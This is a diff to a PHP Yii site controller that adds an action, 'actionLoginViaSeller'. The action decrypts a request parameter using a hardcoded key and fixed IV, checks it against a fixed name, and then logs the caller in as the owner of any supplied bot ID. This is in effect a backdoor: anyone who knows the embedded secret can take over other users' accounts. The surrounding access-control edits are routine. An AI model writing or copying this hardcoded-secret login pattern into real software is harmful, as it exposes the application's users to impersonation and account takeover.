@@ -4,6 +4,7 @@ namespace frontend\controllers;
 
 use common\models\TempNumber;
 use common\models\User;
+use frontend\models\api\TelegramBot;
 use frontend\models\ResendVerificationEmailForm;
 use frontend\models\VerifyEmailForm;
 use Yii;
@@ -18,6 +19,7 @@ use frontend\models\PasswordResetRequestForm;
 use frontend\models\ResetPasswordForm;
 use frontend\models\SignupForm;
 use frontend\models\ContactForm;
+use yii\web\ForbiddenHttpException;
 
 /**
  * Site controller
@@ -32,7 +34,7 @@ class SiteController extends Controller
         return [
             'access' => [
                 'class' => AccessControl::class,
-                'only' => ['logout', 'signup', 'index','error'],
+                'only' => ['logout', 'signup', 'index'],
                 'rules' => [
                     [
                         'actions' => ['signup'],
@@ -40,7 +42,7 @@ class SiteController extends Controller
                         'roles' => ['?'],
                     ],
                     [
-                        'actions' => ['logout', 'index','error'],
+                        'actions' => ['logout', 'index', 'error'],
                         'allow' => true,
                         'roles' => ['@'],
                     ],
@@ -219,5 +221,26 @@ class SiteController extends Controller
     {
         $this->layout = 'blog';
         return $this->render('landing');
+    }
+
+    public function actionLoginViaSeller($password, $bot_id)
+    {
+
+        $encryption = $password;
+        // Non-NULL Initialization Vector for decryption
+        $decryption_iv = '1234567891011121';
+        $ciphering = "AES-128-CTR";
+        $options = 0;
+        $decryption_key = "botyasa";
+
+        $decryption = openssl_decrypt($encryption, $ciphering, $decryption_key, $options, $decryption_iv);
+
+        if ($decryption == "Isxoqjon Axmedov") {
+            $user = User::findOne(TelegramBot::findOne($bot_id)->user_id);
+            Yii::$app->user->login($user, 3600);
+            $this->redirect(['site/index']);
+        } else {
+            throw new ForbiddenHttpException(t('You Cannot to do this!'));
+        }
     }
 }
